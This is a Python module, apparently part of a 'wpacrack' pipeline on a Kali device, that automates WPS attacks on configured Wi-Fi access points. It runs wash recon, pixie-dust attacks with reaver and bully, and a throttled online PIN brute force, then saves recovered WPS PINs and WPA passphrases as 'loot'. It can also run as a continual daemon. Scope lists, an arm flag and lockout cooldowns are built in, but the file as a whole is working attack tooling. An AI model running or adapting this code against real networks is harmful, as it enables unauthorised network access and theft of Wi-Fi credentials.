#!/usr/bin/env python3
"""
wps_attack.py — scope-locked, lockout-SAFE WPS attack module for the wpacrack pipeline (kali-pie).

Sequence (per authorized target only):
  1. RECON   — wash on the target channel; proceed ONLY if WPS present AND not locked. Else stop.
  2. PIXIE   — offline-ish pixie-dust (reaver -K, then bully -d as an alternate). One exchange,
               lowest noise, most likely to land without provoking the AP. Success -> loot, done.
  3. ONLINE  — conservative reaver PIN attempt ONLY if pixie failed: inter-attempt delay, -r
               throttle, --lock-delay, and it ABORTS the instant the AP signals rate-limiting or
               a lock (HARD RULE: never drive the AP into a lockout — losing a run is fine).

Safety gates (belt-and-braces, all must pass before a single frame is sent):
  * Runs ONLY against BSSIDs in wpacrack.conf `targets` (authorized scope; refuses empty).
  * Requires an explicit opt-in `wps_enabled = true` in wpacrack.conf — ships DISABLED so the
    unit can live in the pipeline without ever transmitting until the operator arms it.
  * Per-target retry cooldown: a target that yields nothing (or trips a lock) is marked and
    skipped until the cooldown elapses, so the timer can never grind an AP toward a lock.

Coexists with the WPA harvest via a shared radio flock (both stay in monitor mode — no managed/
monitor churn between them; the lock just serialises who transmits). Leaves wlan1 in monitor mode
for the harvest and never disables the interface. Logs every step; loot -> /opt/wpacrack/loot/.
"""
import os, sys, re, time, shutil, subprocess, fcntl, datetime

# ---------------- config ----------------
CONF_PATHS = ["/opt/wpacrack/wpacrack.conf",
              os.path.join(os.path.dirname(os.path.abspath(__file__)), "wpacrack.conf")]
WORK       = "/opt/wpacrack"
LOOT       = WORK + "/loot"
STATE      = WORK + "/wps_state"                 # per-target tried/cooldown markers
LOG        = WORK + "/wps.log"
STATUS     = WORK + "/WPS_STATUS.txt"
RADIO_LOCK = WORK + "/.radio.lock"               # shared with the WPA harvest
IFACE      = "wlan1"
TARGETS    = []                                  # [(bssid, channel)] from wpacrack.conf

# --- opt-in + lockout-safe tuning (some overridable from wpacrack.conf) ---
WPS_ENABLED        = False    # HARD GATE: nothing transmits unless wpacrack.conf sets wps_enabled=true
ONLINE_ENABLED     = True     # step 3 (pixie is step 2 and preferred)
ONLINE_MAX_SECONDS = 900      # hard cap on the whole online attempt
REAVER_DELAY       = 15       # -d : seconds between PIN attempts (gentle)
REAVER_THROTTLE    = "3:60"   # -r : after 3 attempts, sleep 60s
LOCK_DELAY         = 300      # --lock-delay : if a lock is seen, wait this long (we ABORT instead)
PIXIE_TIMEOUT      = 300      # per pixie tool
# The harvest holds the radio for a whole capture pass (can be ~40 min when no client is present),
# then idles for its cooldown. WPS is opportunistic and only needs the radio briefly a few times a
# day, so it waits patiently for that cooldown window rather than ever interrupting a capture.
RADIO_WAIT_MAX     = 4200     # max seconds to wait for the harvest to yield the radio (~1 macro-cycle)
RADIO_POLL         = 30       # seconds between radio-lock retries while waiting
RETRY_COOLDOWN     = 21600    # 6h : skip a target that recently yielded nothing (no result)
LOCK_COOLDOWN      = 86400    # 24h : much longer back-off after any lock/rate-limit signal
CYCLE_IDLE         = 1800     # --daemon: seconds to idle between full target sweeps
GATE_POLL          = 300      # --daemon: how often to re-check the arm gate while dormant

REQUIRED_TOOLS = ("wash", "reaver", "bully", "iw", "ip")

# lines that mean "the AP is protecting itself" -> stop, do not push further
LOCK_SIGNS = [re.compile(p, re.I) for p in
              [r"rate limit", r"\block(ed|ing)\b", r"AP .*lock", r"WPS.*lock", r"blacklist"]]
PIN_RE = re.compile(r"(?:WPS pin|WPS PIN|Pin is)\D*['\"]?(\d{4,8})['\"]?", re.I)
PSK_RE = re.compile(r"(?:WPA PSK|Key is)\D*['\"]([^'\"]*)['\"]", re.I)
NOTVULN_RE = re.compile(r"not vulnerable|pin not found|failed to recover", re.I)


def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def log(msg):
    line = f"[{now()}] {msg}\n"
    try:
        with open(LOG, "a") as f: f.write(line)
    except Exception: pass
    sys.stderr.write(line)


def set_status(phase, detail=""):
    try:
        with open(STATUS, "w") as f:
            f.write(f"wps_attack STATUS @ {now()}\n  phase : {phase}\n  detail: {detail}\n  iface : {IFACE}\n")
    except Exception: pass
    log(f"{phase}: {detail}")


def _truthy(v):
    return str(v).strip().lower() in ("1", "true", "yes", "on", "enable", "enabled")


def run(cmd, timeout=60):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except subprocess.TimeoutExpired as e:
        return e
    except Exception as e:
        log(f"run error {cmd}: {e}"); return None


def load_conf():
    global IFACE, TARGETS, WPS_ENABLED, ONLINE_ENABLED, RETRY_COOLDOWN, LOCK_COOLDOWN
    global REAVER_DELAY, REAVER_THROTTLE, ONLINE_MAX_SECONDS, CYCLE_IDLE
    TARGETS = []                              # reset so load_conf is idempotent (re-read each daemon cycle)
    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
    if not path:
        log("FATAL: no wpacrack.conf"); sys.exit(2)
    cfg = {}
    for line in open(path):
        line = line.strip()
        if line and not line.startswith("#") and "=" in line:
            k, v = line.split("=", 1); cfg[k.strip().lower()] = v.strip()
    IFACE = cfg.get("iface", IFACE)
    # opt-in + optional tuning overrides
    WPS_ENABLED    = _truthy(cfg.get("wps_enabled", "false"))
    if "wps_online_enabled" in cfg: ONLINE_ENABLED = _truthy(cfg["wps_online_enabled"])
    if "wps_retry_cooldown" in cfg: RETRY_COOLDOWN = int(cfg["wps_retry_cooldown"])
    if "wps_lock_cooldown"  in cfg: LOCK_COOLDOWN  = int(cfg["wps_lock_cooldown"])
    if "wps_reaver_delay"   in cfg: REAVER_DELAY   = int(cfg["wps_reaver_delay"])
    if "wps_reaver_throttle" in cfg: REAVER_THROTTLE = cfg["wps_reaver_throttle"]
    if "wps_online_max_seconds" in cfg: ONLINE_MAX_SECONDS = int(cfg["wps_online_max_seconds"])
    if "wps_cycle_idle" in cfg: CYCLE_IDLE = int(cfg["wps_cycle_idle"])
    for tok in cfg.get("targets", "").split(","):
        tok = tok.strip()
        if ":" in tok:
            bssid, _, ch = tok.rpartition(":")
            if re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid.strip()) and ch.strip().isdigit():
                TARGETS.append((bssid.strip().upper(), int(ch.strip())))
    if not TARGETS:
        log("FATAL: no valid targets in wpacrack.conf — refusing to run"); sys.exit(2)


def _armed_now():
    """Cheap re-read of just the arm gate (so a long radio wait still honours `wps-disarm`)."""
    path = next((p for p in CONF_PATHS if os.path.exists(p)), None)
    if not path:
        return False
    try:
        for line in open(path):
            line = line.strip()
            if line.lower().startswith("wps_enabled") and "=" in line:
                return _truthy(line.split("=", 1)[1])
    except Exception:
        pass
    return False


def published_channel(bssid, hint, ttl=21600):
    """Read the harvest-published current channel for this BSSID (BSSID-anchored rediscovery); fall
    back to the config hint if missing/stale. Keeps WPS on the AP's real channel after a 2.4
    auto-channel change or a 5GHz DFS move."""
    try:
        ch, ts = open(os.path.join(WORK, "channels", bssid.replace(":", ""))).read().split()
        if time.time() - float(ts) < ttl:
            return int(ch)
    except Exception:
        pass
    return hint


def preflight():
    """Refuse to run unless the required WPS tools are installed."""
    missing = [t for t in REQUIRED_TOOLS if not shutil.which(t)]
    if missing:
        log(f"FATAL: missing required tools: {', '.join(missing)} — install reaver/bully/aircrack-ng suite")
        sys.exit(3)


# ---------------- radio coexistence ----------------
_radio_fd = None
def acquire_radio():
    """Block (up to RADIO_WAIT_MAX) for the shared radio lock so we never transmit at the same
    time as the WPA harvest. Returns True on success."""
    global _radio_fd
    _radio_fd = open(RADIO_LOCK, "w")
    t0 = time.time()
    while time.time() - t0 < RADIO_WAIT_MAX:
        try:
            fcntl.flock(_radio_fd, fcntl.LOCK_EX | fcntl.LOCK_NB); return True
        except OSError:
            if not _armed_now():
                log("disarmed while waiting for the radio — standing down (no frames sent)")
                return False
            waited = int(time.time() - t0)
            set_status("wait-radio", f"harvest capturing; waiting {waited}s for spare radio time (never interrupts capture)")
            time.sleep(RADIO_POLL)
    log("radio stayed busy past the wait budget — harvest is busy; will retry next cycle")
    return False

def release_radio():
    global _radio_fd
    if _radio_fd:
        try: fcntl.flock(_radio_fd, fcntl.LOCK_UN); _radio_fd.close()
        except Exception: pass
        _radio_fd = None


def ensure_monitor(ch):
    """Make sure wlan1 is in monitor mode on the target channel. Both WPS and the harvest use
    monitor mode, so we never flip to managed (no churn that could knock out capture)."""
    info = run(["iw", "dev", IFACE, "info"])
    txt = getattr(info, "stdout", "") or ""
    if "type monitor" not in txt:
        run(["ip", "link", "set", IFACE, "down"])
        run(["iw", "dev", IFACE, "set", "type", "monitor"])
        run(["ip", "link", "set", IFACE, "up"])
    run(["iw", "dev", IFACE, "set", "channel", str(ch)])


# ---------------- per-target cooldown (never grind toward a lock) ----------------
def _mark_path(bssid):
    return os.path.join(STATE, bssid.replace(":", "") + ".mark")

def cooldown_remaining(bssid):
    """Return seconds of cooldown left for this target (0 = clear to attempt)."""
    p = _mark_path(bssid)
    if not os.path.exists(p):
        return 0
    try:
        kind, ts = open(p).read().strip().split()
        elapsed = time.time() - float(ts)
        window = LOCK_COOLDOWN if kind == "lock" else RETRY_COOLDOWN
        return max(0, int(window - elapsed))
    except Exception:
        return 0

def mark_attempt(bssid, kind):
    """kind in {'nores','lock'} — records when and why we backed off this target."""
    try:
        os.makedirs(STATE, exist_ok=True)
        with open(_mark_path(bssid), "w") as f:
            f.write(f"{kind} {time.time():.0f}\n")
    except Exception as e:
        log(f"mark_attempt error: {e}")

def clear_mark(bssid):
    try: os.remove(_mark_path(bssid))
    except Exception: pass


# ---------------- recon ----------------
def wash_target(bssid, ch):
    """Return (present, locked) for the target BSSID from a bounded wash scan on its channel."""
    r = run(["timeout", "25", "wash", "-i", IFACE, "-c", str(ch)], timeout=35)
    out = getattr(r, "stdout", "") or ""
    for line in out.splitlines():
        if bssid.upper() in line.upper():
            cols = line.split()
            # BSSID Ch dBm WPS Lck Vendor ESSID...  -> Lck is the 5th field
            locked = len(cols) >= 5 and cols[4].strip().lower() in ("yes", "locked")
            return True, locked
    return False, False


# ---------------- loot ----------------
def already_looted(bssid):
    d = os.path.join(LOOT, bssid.replace(":", ""))
    return os.path.isdir(d) and any(f.endswith(".loot") for f in os.listdir(d))

def save_loot(bssid, ch, method, pin, psk, raw=""):
    d = os.path.join(LOOT, bssid.replace(":", "")); os.makedirs(d, exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    p = os.path.join(d, ts + ".loot")
    body = (f"# wpacrack WPS loot @ {now()}\nBSSID={bssid}\nCHANNEL={ch}\nMETHOD={method}\n"
            f"WPS_PIN={pin or ''}\nWPA_PSK={psk or ''}\n\n--- tool output (tail) ---\n{raw[-1500:]}\n")
    with open(p, "w") as f: f.write(body)
    for h in ("/root", "/home/kali", "/home/kali-pie"):
        try: open(os.path.join(h, "wps_loot.txt"), "a").write(body + "\n")
        except Exception: pass
    log(f"LOOT saved: {bssid} method={method} PIN={pin} PSK={psk!r} -> {p}")
    return p


def parse_pin_psk(text):
    pin = PIN_RE.search(text); psk = PSK_RE.search(text)
    return (pin.group(1) if pin else None), (psk.group(1) if psk else None)


# ---------------- attacks ----------------
def stream_run(cmd, timeout, watch_locks=True):
    """Run a WPS tool, streaming output. Returns (returncode_or_None, collected_output, locked_flag).
    If watch_locks and a lock/rate-limit signal appears, terminates early with locked_flag=True.
    A hard `timeout` wrapper guarantees the tool dies even if it goes silent (the per-line check
    below only fires while output keeps flowing)."""
    wrapped = ["timeout", "-k", "10", str(int(timeout) + 30)] + cmd
    log("exec: " + " ".join(wrapped))
    try:
        p = subprocess.Popen(wrapped, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        log(f"spawn failed: {e}"); return None, "", False
    out = []; locked = False; t0 = time.time()
    try:
        for line in p.stdout:
            out.append(line)
            if watch_locks and any(rx.search(line) for rx in LOCK_SIGNS):
                locked = True
                log("LOCKOUT SIGNAL detected -> backing off to protect the AP: " + line.strip())
                p.terminate(); break
            if PIN_RE.search(line) and PSK_RE.search("".join(out)):
                p.terminate(); break     # got the key, stop early
            if time.time() - t0 > timeout:
                log("tool timeout -> terminating"); p.terminate(); break
    except Exception as e:
        log(f"stream error: {e}")
    try: p.wait(timeout=10)
    except Exception:
        try: p.kill()
        except Exception: pass
    return p.returncode, "".join(out), locked


def pixie(bssid, ch):
    """Offline-ish pixie-dust: reaver -K first, then bully -d as an alternate. One WPS exchange each."""
    set_status("pixie-dust", f"{bssid} ch{ch} — reaver -K")
    rc, out, locked = stream_run(
        ["reaver", "-i", IFACE, "-b", bssid, "-c", str(ch), "-K", "1", "-N", "-vv"],
        timeout=PIXIE_TIMEOUT)
    if locked: return None, None, True
    pin, psk = parse_pin_psk(out)
    if pin or psk:
        return pin, psk, False
    if NOTVULN_RE.search(out):
        log("reaver pixie: AP not vulnerable to pixie-dust")
    # alternate: bully pixie-dust
    set_status("pixie-dust", f"{bssid} ch{ch} — bully -d (alternate)")
    rc, out2, locked = stream_run(
        ["bully", IFACE, "-b", bssid, "-c", str(ch), "-d", "-v", "3"], timeout=PIXIE_TIMEOUT)
    if locked: return None, None, True
    pin, psk = parse_pin_psk(out2)
    return pin, psk, False


def online(bssid, ch):
    """Conservative online PIN attempt. Aborts on the first lock/rate-limit signal (HARD RULE).
    Does NOT use --ignore-locks. Bounded by ONLINE_MAX_SECONDS.
    Returns (pin, psk, locked)."""
    if not ONLINE_ENABLED:
        log("online fallback disabled by config"); return None, None, False
    # re-check lock state right before we start pushing PINs
    present, locked = wash_target(bssid, ch)
    if locked:
        log("online: AP is WPS-locked at pre-check -> not starting (protecting the AP)")
        return None, None, True
    set_status("online-pin", f"{bssid} ch{ch} — conservative reaver (d={REAVER_DELAY} r={REAVER_THROTTLE})")
    rc, out, locked = stream_run(
        ["reaver", "-i", IFACE, "-b", bssid, "-c", str(ch), "-vv", "-N",
         "-d", str(REAVER_DELAY), "-r", REAVER_THROTTLE, "--lock-delay", str(LOCK_DELAY), "-T", "2"],
        timeout=ONLINE_MAX_SECONDS, watch_locks=True)
    if locked:
        log("online: aborted on lock/rate-limit signal — AP protected, run sacrificed (as designed)")
        return None, None, True
    pin, psk = parse_pin_psk(out)
    return pin, psk, False


def attack(bssid, ch):
    if already_looted(bssid):
        log(f"{bssid} already looted — skipping"); return True
    remain = cooldown_remaining(bssid)
    if remain:
        log(f"{bssid}: in cooldown for another {remain}s (recent no-result/lock) — skipping to protect the AP.")
        return False
    set_status("recon", f"wash {bssid} ch{ch}")
    present, locked = wash_target(bssid, ch)
    if not present:
        log(f"{bssid}: WPS not present/active in wash — not attacking blind. STOP.")
        mark_attempt(bssid, "nores"); return False
    if locked:
        log(f"{bssid}: WPS is LOCKED — refusing to attack (would risk permanent lockout). STOP.")
        mark_attempt(bssid, "lock"); return False
    log(f"{bssid}: WPS present and UNLOCKED — proceeding.")
    # step 2: pixie
    pin, psk, locked = pixie(bssid, ch)
    if locked:
        log(f"{bssid}: lock signal during pixie — stopping to protect the AP.")
        mark_attempt(bssid, "lock"); return False
    if pin or psk:
        save_loot(bssid, ch, "pixie-dust", pin, psk); clear_mark(bssid); return True
    log(f"{bssid}: pixie-dust did not recover a key.")
    # step 3: conservative online fallback
    pin, psk, locked = online(bssid, ch)
    if pin or psk:
        save_loot(bssid, ch, "online-pin", pin, psk); clear_mark(bssid); return True
    if locked:
        mark_attempt(bssid, "lock")
    else:
        mark_attempt(bssid, "nores")
    log(f"{bssid}: no key recovered (pixie + conservative online exhausted/aborted).")
    return False


def sweep():
    """One full pass over the authorized targets under the shared radio lock. Assumes the arm
    gate has already passed and preflight() has run. Yields the radio to the harvest afterwards."""
    if not acquire_radio():
        log("could not acquire the radio within budget (harvest busy) — will retry next sweep. STOP.")
        return
    try:
        for bssid, ch in TARGETS:
            ch = published_channel(bssid, ch)   # follow the AP if it changed channel
            ensure_monitor(ch)
            try:
                attack(bssid, ch)
            except Exception:
                import traceback; log("attack error:\n" + traceback.format_exc())
    finally:
        # leave wlan1 in monitor mode for the harvest; just drop the radio lock
        release_radio()
        set_status("idle", "radio released back to harvest (monitor mode preserved)")


def run_once():
    """A single pass (used by the manual `wps-run` helper). Honours the arm gate + cooldowns."""
    os.makedirs(LOOT, exist_ok=True)
    os.makedirs(STATE, exist_ok=True)
    load_conf()
    if not WPS_ENABLED:
        set_status("disabled", "wps_enabled is not true in wpacrack.conf — WPS stays dormant (no frames sent)")
        log("wps_enabled != true -> exiting without transmitting. Set 'wps_enabled = true' in wpacrack.conf to arm.")
        return
    preflight()
    set_status("init", f"targets={TARGETS}")
    sweep()


def daemon_loop():
    """Continual active service: stay up, re-read the arm gate every cycle (so `wps-arm`/`wps-disarm`
    take effect without a restart), and sweep the targets whenever armed. The per-target cooldown
    markers (6h no-result / 24h after a lock) mean 'continual' never means 'hammering' — each target
    is attempted at most once per cooldown window. Coexists with the harvest via the shared radio
    lock; both stay in monitor mode throughout."""
    os.makedirs(LOOT, exist_ok=True)
    os.makedirs(STATE, exist_ok=True)
    preflighted = False
    log("wps_attack daemon starting (continual, lockout-safe, harvest-coexisting)")
    while True:
        try:
            load_conf()
            if not WPS_ENABLED:
                set_status("dormant", "wps_enabled=false — service up but idle (no frames sent). Arm with `sudo wps-arm`.")
                time.sleep(GATE_POLL)
                continue
            if not preflighted:
                preflight(); preflighted = True
            set_status("armed", f"sweeping {len(TARGETS)} target(s); cycle idle {CYCLE_IDLE}s")
            sweep()
        except SystemExit:
            raise
        except Exception:
            import traceback; log("daemon cycle error:\n" + traceback.format_exc())
        time.sleep(CYCLE_IDLE)


if __name__ == "__main__":
    if "--daemon" in sys.argv:
        daemon_loop()
    else:
        run_once()
